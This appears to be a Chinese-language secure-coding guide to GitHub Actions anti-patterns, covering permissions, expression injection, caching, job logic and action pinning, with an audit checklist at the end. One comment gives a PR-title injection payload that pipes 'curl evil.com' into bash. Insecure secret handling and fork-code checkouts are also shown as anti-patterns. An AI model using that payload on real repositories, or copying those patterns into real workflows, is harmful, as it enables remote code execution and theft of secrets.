# Workflow 常見反模式與修正

## 安全性反模式

### 1. permissions 過度開放

```yaml
# ❌ 反模式：全開權限
permissions: write-all

# ✅ 修正：最小化權限
permissions:
  contents: read
  pull-requests: write
```

**為什麼危險**：如果任何 step 被注入惡意程式碼（如 PR title injection），攻擊者獲得所有權限。

### 2. 不安全的表達式注入

```yaml
# ❌ 反模式：直接插入用戶可控內容到 run
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# 攻擊者可在 PR title 寫: "; curl evil.com | bash; echo "

# ✅ 修正：透過環境變數傳遞
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

**危險來源**（可被用戶控制的值）：
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.head_ref`（分支名稱）
- `github.event.commits[*].message`

### 3. pull_request_target 誤用

```yaml
# ❌ 反模式：pull_request_target + checkout PR HEAD
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # 危險！
  - run: npm install  # 執行 fork PR 的惡意代碼，但擁有 write 權限

# ✅ 修正方案 A：用 pull_request（無 write 權限但安全）
on: pull_request

# ✅ 修正方案 B：分離 checkout 和執行
# Job 1: pull_request_target 只讀取安全資料
# Job 2: 用 workflow_run 觸發，拿到 artifacts 再執行
```

### 4. Secrets 暴露

```yaml
# ❌ 反模式：log 中印出 secrets
- run: echo "Token is ${{ secrets.API_TOKEN }}"

# ❌ 反模式：寫入 artifact
- run: echo "${{ secrets.API_TOKEN }}" > config.txt
- uses: actions/upload-artifact@v4
  with:
    path: config.txt

# ✅ 正確：secrets 只在需要的 step 中透過 env 使用
- env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com
```

---

## 效能反模式

### 5. 缺少快取

```yaml
# ❌ 反模式：每次都完整安裝依賴
- run: npm ci  # 每次 3-5 分鐘

# ✅ 修正：使用 cache
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'
- run: npm ci  # 有快取時 30 秒
```

### 6. 不必要的 full checkout

```yaml
# ❌ 反模式：checkout 完整歷史
- uses: actions/checkout@v4
  with:
    fetch-depth: 0  # 大型 repo 可能花數分鐘

# ✅ 修正：只需最近的 commit（除非需要 git history）
- uses: actions/checkout@v4  # 預設 fetch-depth: 1
```

### 7. 序列化可平行的 jobs

```yaml
# ❌ 反模式：lint → test → build 串行
jobs:
  lint:
    ...
  test:
    needs: lint  # test 不依賴 lint 結果
    ...
  build:
    needs: test  # build 不依賴 test 結果
    ...

# ✅ 修正：平行執行，只在部署時合流
jobs:
  lint:
    ...
  test:
    ...
  build:
    ...
  deploy:
    needs: [lint, test, build]  # 合流點
    ...
```

### 8. Matrix 過度使用

```yaml
# ❌ 反模式：測試所有組合（3 × 3 × 3 = 27 個 job）
strategy:
  matrix:
    os: [ubuntu, macos, windows]
    node: [18, 20, 22]
    db: [postgres, mysql, sqlite]

# ✅ 修正：只測試關鍵組合
strategy:
  matrix:
    include:
      - os: ubuntu-latest
        node: 20
        db: postgres
      - os: ubuntu-latest
        node: 18
        db: postgres
      - os: windows-latest
        node: 20
        db: sqlite
```

---

## 邏輯反模式

### 9. 條件判斷遺漏

```yaml
# ❌ 反模式：只判斷事件類型，忘記判斷 action
on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

jobs:
  deploy:
    if: github.event.pull_request.merged == true
    # 問題：PR 被 close（非 merge）時也會觸發 workflow，只是 job 被 skip
    # 但 workflow run 仍然出現，造成混亂

# ✅ 修正：在 trigger 就限制
on:
  pull_request:
    types: [closed]

jobs:
  deploy:
    if: github.event.pull_request.merged == true
```

### 10. needs 條件與 if 衝突

```yaml
# ❌ 反模式：上游 job 被 skip，下游也全部 skip
jobs:
  check:
    if: github.event_name == 'pull_request'
    ...
  deploy:
    needs: check  # 如果 check 被 skip，deploy 也被 skip（即使 push 事件應該部署）

# ✅ 修正：加上 always() 或 success()
jobs:
  deploy:
    needs: check
    if: always() && (needs.check.result == 'success' || needs.check.result == 'skipped')
```

### 11. 環境變數作用域混淆

```yaml
# ❌ 反模式：在 step 中設定的 env 期望在下一個 step 生效
- run: export MY_VAR=hello    # 這個 export 下一步看不到

# ✅ 修正：使用 GITHUB_ENV
- run: echo "MY_VAR=hello" >> "$GITHUB_ENV"

# ✅ 或使用 step output
- id: set-var
  run: echo "my_var=hello" >> "$GITHUB_OUTPUT"
- run: echo "${{ steps.set-var.outputs.my_var }}"
```

### 12. Concurrency 衝突

```yaml
# ❌ 反模式：不同 workflow 共用同一個 concurrency group
# ci.yml
concurrency:
  group: ${{ github.ref }}      # "refs/heads/main"
# deploy.yml
concurrency:
  group: ${{ github.ref }}      # 也是 "refs/heads/main"，會互相取消！

# ✅ 修正：加上 workflow 名稱作為 namespace
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

---

## 維護性反模式

### 13. Action 版本不固定

```yaml
# ❌ 反模式：使用 major tag（可能被供應鏈攻擊）
- uses: actions/checkout@v4

# ⚠️ 較安全：pin 到 commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

# ✅ 最佳實踐：SHA + 版本註解
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

### 14. 重複邏輯未抽取

```yaml
# ❌ 反模式：多個 workflow 重複相同的 setup steps

# ✅ 修正方案 A：Composite Action
# .github/actions/setup/action.yml
name: 'Project Setup'
runs:
  using: 'composite'
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: 20
        cache: 'npm'
    - run: npm ci
      shell: bash

# ✅ 修正方案 B：Reusable Workflow
# .github/workflows/reusable-test.yml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '20'
```

### 15. 缺少 timeout

```yaml
# ❌ 反模式：沒設 timeout，預設 360 分鐘
jobs:
  test:
    runs-on: ubuntu-latest

# ✅ 修正：設定合理 timeout
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
```

---

## Workflow 審計 Checklist

審查一個 workflow 時，依序檢查：

```
□ 安全性
  □ permissions 是否最小化？
  □ 有無表達式注入風險？
  □ pull_request_target 使用是否安全？
  □ secrets 是否只在必要 step 中使用？
  □ third-party actions 是否 pin 到 SHA？

□ 效能
  □ 是否有快取策略？
  □ jobs 是否盡可能平行？
  □ checkout 是否只取必要深度？
  □ matrix 是否合理？

□ 正確性
  □ 觸發條件是否精確（不多不少）？
  □ if 條件是否完整（事件類型 + action）？
  □ needs 依賴鏈是否正確？
  □ output 傳遞是否有 step id？
  □ 環境變數作用域是否正確？

□ 維護性
  □ 有無重複邏輯可抽取？
  □ 有無合理 timeout？
  □ concurrency group 是否唯一？
  □ 是否有清晰的 job/step 命名？
```
